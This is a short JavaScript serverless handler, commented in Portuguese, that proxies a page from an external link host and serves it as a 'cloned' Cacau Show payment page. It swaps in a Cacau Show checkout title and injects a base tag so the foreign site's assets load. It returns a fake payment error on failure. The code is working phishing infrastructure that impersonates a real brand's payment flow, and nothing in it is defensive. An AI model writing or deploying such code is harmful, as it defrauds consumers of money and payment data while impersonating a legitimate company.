export default async function handler(req, res) {
  // ⚠️ COLOQUE SEU SEGUNDO LINK REAL AQUI
  const TARGET_URL = "https://phantoms.group/l/falha1?shk=3cri8ete";

  try {
    const response = await fetch(TARGET_URL, {
      headers: {
        "User-Agent": req.headers["user-agent"],
      }
    });

    let html = await response.text();

    // LIMPEZA: Remove o título original e coloca o da Cacau Show
    html = html.replace(/<title>.*?<\/title>/gi, "<title>Cacau Show | Pagamento</title>");
    
    // MÁGICA: Injeta uma tag <base> para que as imagens e o CSS carreguem do site original
    // Isso evita que a página fique branca ou quebrada
    const baseTag = `<base href="https://phantoms.group/l/">`;
    html = html.replace('<head>', `<head>${baseTag}`);

    // Garante que o navegador entenda que é um site HTML
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    
    // Entrega o site "clonado" para o cliente
    return res.status(200).send(html);

  } catch (error) {
    console.error(error);
    return res.status(500).send("Erro ao processar o pagamento. Tente novamente.");
  }
}
